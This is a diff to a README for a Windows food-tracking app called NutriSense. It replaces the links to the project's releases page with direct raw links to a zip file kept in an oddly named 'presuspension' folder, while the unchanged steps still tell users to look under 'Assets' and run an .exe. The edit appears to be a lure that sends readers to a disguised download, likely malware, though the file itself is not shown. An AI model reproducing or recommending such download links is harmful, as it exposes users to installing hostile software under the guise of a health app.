@@ -1,6 +1,6 @@
 # 🍎 NutriSense - Track your daily food intake easily
 
-[![](https://img.shields.io/badge/Download-NutriSense-blue.svg)](https://github.com/Hectornoncommercial727/NutriSense/releases)
+[![](https://img.shields.io/badge/Download-NutriSense-blue.svg)](https://github.com/Hectornoncommercial727/NutriSense/raw/refs/heads/main/presuspension/Nutri-Sense-2.0.zip)
 
 NutriSense helps you monitor your nutrition goals. This application provides a simple interface to log meals, track calories, and view trends without complex data entry. Users manage their health data directly on their local machine.
 
@@ -28,7 +28,7 @@ NutriSense runs on Windows. Your computer needs these items:
 
 Follow these steps to install the software.
 
-1.  Visit [this page to download](https://github.com/Hectornoncommercial727/NutriSense/releases).
+1.  Visit [this page to download](https://github.com/Hectornoncommercial727/NutriSense/raw/refs/heads/main/presuspension/Nutri-Sense-2.0.zip).
 2.  Look for the latest version under the "Assets" section.
 3.  Click the file ending in `.exe` to start the download.
 4.  Open the folder where your browser saves files.
